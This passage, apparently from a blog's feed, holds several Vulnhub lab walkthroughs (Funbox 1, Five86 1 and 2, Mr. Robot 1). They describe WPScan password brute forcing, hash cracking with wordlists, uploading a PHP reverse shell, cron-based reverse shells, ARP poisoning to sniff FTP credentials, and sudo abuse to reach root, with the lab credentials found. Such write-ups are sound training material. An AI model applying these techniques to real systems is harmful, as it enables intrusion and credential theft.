+<p>Both the <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">funny</code> users have a cronjob to run this file, providing us with a reverse shell if executed. At this point, by removing the cronjob for <code class="language-plaintext highlighter-rouge">funny</code>, only the <code class="language-plaintext highlighter-rouge">root</code> user will execute the file, allowing us to gain root access. So, I went ahead and removed the cronjob for <code class="language-plaintext highlighter-rouge">funny</code>.</p>
+
+<p><img src="/assets/images/fun-box-1/12.png" alt="" /></p>
+
+<p>i Just modify the file once again to change the port and start a new listener for root. Within a few moment i got the reverse connection as root.</p>
+
+<p><img src="/assets/images/fun-box-1/13.png" alt="" /></p>
+
+<h1 id="bonus">Bonus</h1>
+
+<p>While enumerating as the ‘funny’ user, I noticed that this user is also a member of the ‘lxd’ group. This discovery is quite interesting. After some research, I found a publicly available privilege escalation exploit for this scenario. We could proceed with it.</p>
+
+<p><img src="/assets/images/fun-box-1/14.png" alt="" /></p>
+
+<p>I searched in the searchsploit database and found one result with a Bash script. However, there are some prerequisites for this attack to work—specifically, the <code class="language-plaintext highlighter-rouge">lxd</code> and <code class="language-plaintext highlighter-rouge">lxc</code> components need to be installed on the machine.</p>
+
+<p><img src="/assets/images/fun-box-1/15.png" alt="" /></p>
+
+<p>The binaries are available inside the machine.</p>
+
+<p><img src="/assets/images/fun-box-1/16.png" alt="" /></p>
+
+<p>Although both binaries are present inside the box, I’ve decided not to pursue them since I already have root access. Skipping the ‘funny’ user’s part, with a bit of luck, we might catch the root reverse-shell on the first attempt. There are multiple ways to achieve root on this machine. I thoroughly enjoyed working on this machine.</p>]]></content><author><name>raju</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[I personally found this box quite interesting. To gain the initial foothold, I ran WPScan with a password list, using rockyou.txt which led to the discovery of two valid user credentials for the web console. One of these users also had SSH access to the box. However, obtaining the shell wasn’t enough; there was an additional step to escape the rbash shell. For root access, post-enumeration was crucial, as there were multiple ways to achieve it. Some methods were relatively straightforward, while others required additional research.]]></summary></entry><entry><title type="html">Vulnhub Five86 1 Walkthrough</title><link href="http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Five86 1 Walkthrough" /><published>2023-11-11T00:00:00+05:30</published><updated>2023-11-11T00:00:00+05:30</updated><id>http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough/"><![CDATA[<p>There are two enabled HTTP services and one SSH service. One of the HTTP services, called ‘opennetadmin,’ is outdated and has a publicly available exploit that provides the initial foothold. To escalate privileges for the first user access, find the ‘.htpassword’ file, which contains the username and password hash with a clue. Abusing the misconfigured ‘copy’ binary gives us the second user access. For the third user access, check the mailbox where you will find the last user’s credentials. At this point, we only need to find the secret game directory and execute a SUID binary to gain root access.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap_service_scan <span class="nv">$IP</span>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd <span class="o">(</span>RSA<span class="o">)</span>
+|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+| http-robots.txt: 1 disallowed entry 
+|_/ona
+10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>From the Nmap scan, we identified three open ports: SSH and two web servers. Port 80 has the ‘robots.txt’ file available, with a disallow entry. Port 10000 is also open, hosting Miniserv 1.920. Additionally, ports 22 and 80 confirmed that it’s a Debian-based Linux system. I would like to begin by exploring the web servers, so let’s dive into those.</p>
+
+<h2 id="manual-inspection">Manual Inspection</h2>
+
+<p><img src="/assets/images/five86-1/1.png" alt="" /></p>
+
+<p>Port 80 hosts a Webmin login panel, and as of now, I don’t have any credentials. I attempted the default credentials, but they did not work. Let’s visit port 80 to explore further.</p>
+
+<p><img src="/assets/images/five86-1/2.png" alt="" /></p>
+
+<p>Here, we’ve encountered a control panel that is displaying an outdated version warning. Let’s search for publicly available exploits for this specific version, if any are available.</p>
+
+<p><img src="/assets/images/five86-1/3.png" alt="" /></p>
+
+<p>Through Searchsploit, I discovered three exploits, and two of them match the version number. One of the exploits is available in the Metasploit framework. While I attempted the other bash file, the shell proved to be unstable. As a result, I’m opting to try the Metasploit framework.</p>
+
+<p><img src="/assets/images/five86-1/4.png" alt="" /></p>
+
+<p>From the metasploit i found only one command injection exploit.</p>
+
+<p><strong>Creds</strong></p>
+
+<aside>
+💡 douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
+
+</aside>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p>I configured the ‘rhosts’ and ‘lhosts,’ then executed the exploit. After a few moments, it provided me with a shell as ‘www-data’.</p>
+
+<p><img src="/assets/images/five86-1/5.png" alt="" /></p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p>After obtaining the shell, I explored the file system, and within ‘/var/www/html,’ I discovered the hidden ‘.htaccess’ file. This file contained a clue about the existence of a ‘.htpasswd’ file inside the ‘/var/www’ directory. Upon examining the ‘.htpasswd’ file, I found the ‘douglas’ user and his password MD5 hash, along with a clue on how to generate the password list for brute-force attacks.</p>
+
+<p><img src="/assets/images/five86-1/6.png" alt="" /></p>
+
+<p>Following the clue, I generated a wordlist using Crunch.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 10 10 aefhrt <span class="o">&gt;</span> wordlist.txt
+</code></pre></div></div>
+
+<p>The wordlist is so big.</p>
+
+<p><img src="/assets/images/five86-1/7.png" alt="" /></p>
+
+<p>While searching for ideas to optimize the wordlist due to its size and the potential time it would take, I came across a blog post. From the walkthrough, I got the idea to make the wordlist shorter. Observing that not every character from the clue was present in each line, I revised the wordlist to ensure that every character appeared in every line.</p>
+
+<p><img src="/assets/images/five86-1/8.png" alt="" /></p>
+
+<p>I initially ran John using the smaller wordlist. If I didn’t obtain any passwords, my plan was to then run it with the larger one. During that attempt, I would exclude the passwords containing characters I had already tried. This approach eliminates the need to check passwords that have already been tested. However, the password has already been decrypted using the small wordlist.</p>
+
+<p><img src="/assets/images/five86-1/9.png" alt="" /></p>
+
+<p>As the ssh port is available using this credential i just tried to login and it succeed.</p>
+
+<p><img src="/assets/images/five86-1/10.png" alt="" /></p>
+
+<p>Inside the Douglas user’s home directory, there is nothing but a .ssh directory. However, when I tried checking the sudo permissions for this user, I discovered that the user can run the ‘copy’ command with sudo privileges as the ‘jen’ user. Exploiting this misconfiguration allows us to copy anything we want. The challenge lies in not knowing the exact file location since the ‘copy’ command doesn’t provide that information. However, since there is SSH open, we can copy an authorized key into the ‘jen’ user’s home directory, allowing us to obtain an SSH shell as ‘jen’.</p>
+
+<p><img src="/assets/images/five86-1/11.png" alt="" /></p>
+
+<p>Here i have copied the id_rsa.pub key inside the /tmp folder.</p>
+
+<p><img src="/assets/images/five86-1/12.png" alt="" /></p>
+
+<p>Here, I executed the command to transfer the RSA file into the ‘jen’ user’s ‘home/.ssh’ directory as ‘authorized_keys’ and attempted to SSH as ‘jen.’ The operation succeeded, and I now have a shell as ‘jen’.</p>
+
+<p><img src="/assets/images/five86-1/13.png" alt="" /></p>
+
+<p>When I established the SSH connection, I noticed a message stating ‘You have mail.’ Directly navigating to the mail directory, I discovered a mail file named ‘jen.’ Inside the mail, I found the password for the ‘moss’ user.</p>
+
+<p><img src="/assets/images/five86-1/14.png" alt="" /></p>
+
+<p>I just changed the user as moss using the password found from the mail and found a hidden directory inside the moss users home directory called games.</p>
+
+<p><img src="/assets/images/five86-1/15.png" alt="" /></p>
+
+<p>Here are lots of games available but one of them has the SUID which could be the way for the root.</p>
+
+<p><img src="/assets/images/five86-1/16.png" alt="" /></p>
+
+<p>I just run the games and tried with random inputs but it gives me the root access every time so i assume there is nothing based on the input. And i’m root now.</p>
+
+<p><img src="/assets/images/five86-1/17.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Five86-Series" /><summary type="html"><![CDATA[There are two enabled HTTP services and one SSH service. One of the HTTP services, called ‘opennetadmin,’ is outdated and has a publicly available exploit that provides the initial foothold. To escalate privileges for the first user access, find the ‘.htpassword’ file, which contains the username and password hash with a clue. Abusing the misconfigured ‘copy’ binary gives us the second user access. For the third user access, check the mailbox where you will find the last user’s credentials. At this point, we only need to find the secret game directory and execute a SUID binary to gain root access.]]></summary></entry><entry><title type="html">Vulnhub Five86 2 Walkthrough</title><link href="http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Five86 2 Walkthrough" /><published>2023-11-11T00:00:00+05:30</published><updated>2023-11-11T00:00:00+05:30</updated><id>http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough</id><content type="html" xml:base="http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough/"><![CDATA[<p>This is the last machine so far from this five86 series. This series proved to be interesting, offering numerous learning opportunities. Among the publicly available ports, FTP and the web server were present. However, the FTP was well-configured, with nothing initially available. The web application, when scanned using WPScanner, revealed some users and two valid user credential combinations. Upon obtaining the user credentials, logging into the web console and exploiting a simple file upload functionality provided the initial foothold. Password re-use granted the first user privilege. Achieving the second user privilege required executing an ARP poisoning attack. Finally, the third and last step to gain root access involved exploiting a misconfiguration in file super permissions.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap_service_scan <span class="nv">$IP</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5e
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Five86-2 &amp;#8211<span class="p">;</span> Just another WordPress site
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-generator: WordPress 5.1.4
+Service Info: OS: Unix
+</code></pre></div></div>
+
+<p>According to the Nmap results, there are only two open ports on the system. Port 21 hosts an FTP service running ProFTPD version 1.3.5e, while port 80 serves a WordPress web application with WordPress version 5.1.4. The banners from both ports indicate that the operating system is Ubuntu.</p>
+
+<h2 id="manual-inspection">Manual Inspection</h2>
+
+<p>First i would like to check the FTP servers with default credentials.</p>
+
+<p><img src="/assets/images/five86-2/1.png" alt="" /></p>
+
+<p>The anonymous login did not worked. So, let’s move forward with the web application.</p>
+
+<p><img src="/assets/images/five86-2/2.png" alt="" /></p>
+
+<p>When I visited the IP address, I noticed issues with the CSS not rendering properly. Additionally, hovering over a link displayed the domain name as ‘five86-2’. To address this, I plan to add the corresponding entry to the hosts file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"192.168.197.136 five86-2"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<p>After adding the domain name to the hosts file, accessing the web application resulted in proper loading. However, I observed two additional links that, upon clicking, initiated the download of XML files.</p>
+
+<p><img src="/assets/images/five86-2/3.png" alt="" /></p>
+
+<p>The downloaded files turned out to be XML files with templates, which didn’t pique my interest. Consequently, I opted to skip these files and continue exploring.</p>
+
+<p><img src="/assets/images/five86-2/4.png" alt="" /></p>
+
+<p>Given that it’s a WordPress site, I decided to leverage WPScanner, which offers a password attack feature. To enhance the effectiveness of the attack, I attempted to generate a wordlist tailored to the web application. For this task, I employed the <code class="language-plaintext highlighter-rouge">cewl</code> tool.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl <span class="nt">-d</span> 3 <span class="nt">-w</span> password.txt http://five86-2
+</code></pre></div></div>
+
+<p>The generated word list isn’t extensive, and I’m uncertain if it will yield any valid credentials. In case it doesn’t produce any results, I plan to run the <code class="language-plaintext highlighter-rouge">rockyou</code> word list for a more comprehensive attempt.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--enumerate</span> <span class="nt">--passwords</span> password.txt <span class="nt">--url</span> five86-2
+
+<span class="o">[</span>+] URL: http://five86-2/ <span class="o">[</span>192.168.197.136]
+<span class="o">[</span>+] Started: Fri Nov 10 22:11:22 2023
+
+Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
+
+<span class="o">[</span>+] WordPress version 5.1.4 identified <span class="o">(</span>Insecure, released on 2019-12-12<span class="o">)</span><span class="nb">.</span>
+
+<span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentynineteen
+
+<span class="o">[</span>+] Enumerating Vulnerable Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
+
+<span class="o">[</span>i] No plugins Found.
+
+<span class="o">[</span>i] No themes Found.
+
+<span class="o">[</span>i] No Timthumbs Found.
+
+<span class="o">[</span>i] No Config Backups Found.
+
+<span class="o">[</span>i] No DB Exports Found.
+
+<span class="o">[</span>i] No Medias Found.
+
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] admin
+<span class="o">[</span>+] barney
+<span class="o">[</span>+] gillian
+<span class="o">[</span>+] peter
+<span class="o">[</span>+] stephen
+
+<span class="o">[</span>i] No Valid Passwords Found.
+</code></pre></div></div>
+
+<p>As anticipated, WPScanner provided valid usernames, but unfortunately, no corresponding passwords. To address this, I intend to rerun WPScanner, this time utilizing the <code class="language-plaintext highlighter-rouge">rockyou</code> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> five86-2 <span class="nt">--passwords</span> /usr/share/wordlists/rockyou.txt
+<span class="nt">---snip---</span>
+<span class="o">[</span>+] Valid Combinations Found:
+ | Username: barney, Password: spooky1
+ | Username: stephen, Password: apollo1
+</code></pre></div></div>
+
+<p>This time, WPScanner yielded two valid credential combinations. I proceeded to attempt the login with the first set, using ‘barney’ as the username, and it successfully granted access.</p>
+
+<p><img src="/assets/images/five86-2/5.png" alt="" /></p>
+
+<p>After a few examination i have discovered that there is a functionality of adding post where i can upload files as well. however we need to submit a zip file inside the zip there should be one html file.</p>
+
+<p><img src="/assets/images/five86-2/6.png" alt="" /></p>
+
+<p>Following the specified criteria, I generated a PHP file containing malicious code, along with an empty HTML file, and compiled them into a zip archive.</p>
+
+<p><img src="/assets/images/five86-2/7.png" alt="" /></p>
+
+<p>I uploaded the file using the default options, selecting ‘iFrame,’ and it provided me with the file path of the HTML file.</p>
+
+<p><img src="/assets/images/five86-2/8.png" alt="" /></p>
+
+<p>Since my HTML file is located here, I expect that my PHP file should also be present in the same location.</p>
+
+<p><strong>Creds</strong></p>
+
+<aside>
+💡 barney:spooky1
+stephen:apollo1                                                                                                         paul:esomepasswford
+
+</aside>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p>With knowledge of the PHP file path, I initiated a netcat listener to capture the reverse shell and visited the corresponding URL.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://five86-2//wp-content/uploads/articulate_uploads/shell3/shell.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/five86-2/9.png" alt="" /></p>
+
+<p>And i got the reverse shell as www-data.</p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p>Since we obtained two valid user credentials from WPScanner, we can now proceed with a password re-use attack.</p>
+
+<p><img src="/assets/images/five86-2/10.png" alt="" /></p>
+
+<p>I attempted to use Barney’s credentials, but they were unsuccessful. However, Stephen’s credentials worked, granting me Stephen’s privileges. Upon checking sudo permissions for these users, it appears that the user is not permitted to run sudo. To gather more information, I examined the groups Stephen belongs to, and an interesting detail emerged: the ‘pcap’ group.</p>
+
+<p><img src="/assets/images/five86-2/11.png" alt="" /></p>
+
+<blockquote>
+  <p>What is this 1009(pcap) ?                                                                                             Regarding <code class="language-plaintext highlighter-rouge">1009(pcap)</code>, it indicates that the user is a member of a group with the group ID (GID) of 1009, and the group name is “pcap.” The “pcap” group is often associated with network packet capture permissions, and members of this group may have elevated privileges for capturing network traffic.</p>
+
+</blockquote>
+
+<p>So i tried to find out all the interesting files capabilities and found the g <code class="language-plaintext highlighter-rouge">tcpdump</code> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="/assets/images/five86-2/12.png" alt="" /></p>
+
+<p>I’ve identified all the running interfaces and aim to conduct an ARP poisoning attack to intercept data transmitted over any non-secure protocols. From the earlier Nmap results, I observed that the FTP port is open, and FTP is a non-secure protocol. There’s a possibility that if someone attempts to log in to the FTP protocol, we could capture their credentials in plain text.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump <span class="nt">-D</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/five86-2/13.png" alt="" /></p>
+
+<p>I want to first dump the first interface.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump <span class="nt">-i</span> br-eca3858d86bf
+</code></pre></div></div>
+
+<p><img src="/assets/images/five86-2/14.png" alt="" /></p>
+
+<p>I discovered the credentials for the user ‘paul’ during the ARP poisoning attack. In this controlled scenario, there might be a script performing these login requests. However, in a real environment, we would need to wait for a genuine user to initiate such actions. With the ‘paul’ user credentials in hand, I attempted to switch users, and the process succeeded.</p>
+
+<p><img src="/assets/images/five86-2/15.png" alt="" /></p>
+
+<p>After obtaining the shell as ‘paul,’ I checked the sudo privileges and discovered that he can execute the service binary with sudo without entering a password.</p>
+
+<p><img src="/assets/images/five86-2/16.png" alt="" /></p>
+
+<p>While the primary purpose of the service binary is to manage services, including starting, stopping, restarting, and checking their status, I exploited it to launch /bin/bash. This action granted me the ‘peter’ privilege.</p>
+
+<p><img src="/assets/images/five86-2/17.png" alt="" /></p>
+
+<p>Upon inspecting Peter’s sudo permissions, I discovered that he can execute the passwd command as root without requiring a password. Exploiting this, I changed the root user’s password and successfully logged in as root with the updated credentials.</p>
+
+<p><img src="/assets/images/five86-2/18.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Five86-Series" /><summary type="html"><![CDATA[This is the last machine so far from this five86 series. This series proved to be interesting, offering numerous learning opportunities. Among the publicly available ports, FTP and the web server were present. However, the FTP was well-configured, with nothing initially available. The web application, when scanned using WPScanner, revealed some users and two valid user credential combinations. Upon obtaining the user credentials, logging into the web console and exploiting a simple file upload functionality provided the initial foothold. Password re-use granted the first user privilege. Achieving the second user privilege required executing an ARP poisoning attack. Finally, the third and last step to gain root access involved exploiting a misconfiguration in file super permissions.]]></summary></entry><entry><title type="html">Vulnhub Mr. Robot 1 Walkthrough</title><link href="http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Mr. Robot 1 Walkthrough" /><published>2023-11-11T00:00:00+05:30</published><updated>2023-11-11T00:00:00+05:30</updated><id>http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough/"><![CDATA[<h1 id="mr-robot-1">Mr. Robot-1</h1>
+
+<p>For the initial foothold, we need to discover the underlying technology of the web application. Upon checking the hidden files or directories, I found that it’s a WordPress web application. Additionally, I found the robots.txt file along with two other files, one of which is a wordlist. We can scan the application through WPScan with the wordlist, which should give us valid administrative user credentials.</p>
+
+<p>After logging into the account, there are two ways to get a reverse shell: by adding a reverse shell plugin or by editing existing files. The privilege escalation is pretty straightforward; we need to identify the SUID binaries, where an older version of nmap is available with an interactive mode, which can lead to root privilege.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<p><strong>Nmap</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+|_http-server-header: Apache
+443/tcp open  ssl/http Apache httpd
+|_http-server-header: Apache
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>From the Nmap scan, we discovered only two open ports: 80 and 443, both of which are serving an Apache server. Additionally, we identified a domain name, <a href="http://www.example.com/"><code class="language-plaintext highlighter-rouge">www.example.com</code></a>. We can add this domain to our host file and interact with it. Let’s begin by visiting the web application through the browser.</p>
+
+<p><strong>Manual Inspection</strong></p>
+
+<p>Both ports are serving the same web application, which resembles a machine web console. However, the available commands are limited, and it appears to be a simulated command-line interface rather than an original one. Given the constraints, there doesn’t seem to be a way to abuse this functionality.</p>
+
+<p><img src="/assets/images/mr-robot-1/1.png" alt="" /></p>
+
+<p>Alright, let’s fire up Gobuster to perform directory and file fuzzing. This will help us uncover any hidden directories or files that might not be readily accessible through the web application interface. Gobuster is a powerful tool for this purpose, and it can help us gather more information about the web server and its directory structure.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.197.146 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://192.168.197.146
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 238] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/images/]
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 234] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/js/]
+/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/admin/]
+/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 242] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/wp-content/]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/css/]
+/wp-admin             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 240] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/wp-admin/]
+/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 243] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/wp-includes/]
+/xmlrpc               <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 42]
+/login                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/wp-login.php]
+/blog                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/blog/]
+/feed                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/feed/]
+/rss                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/feed/]
+/video                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/video/]
+/sitemap              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+/image                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/image/]
+/audio                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/audio/]
+/phpmyadmin           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 94]
+/dashboard            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/wp-admin/]
+/wp-login             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2761]
+/0                    <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/0/]
+/atom                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/feed/atom/]
+/robots               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 41]
+/license              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 19930]
+/intro                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 516314]
+/Image                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/Image/]
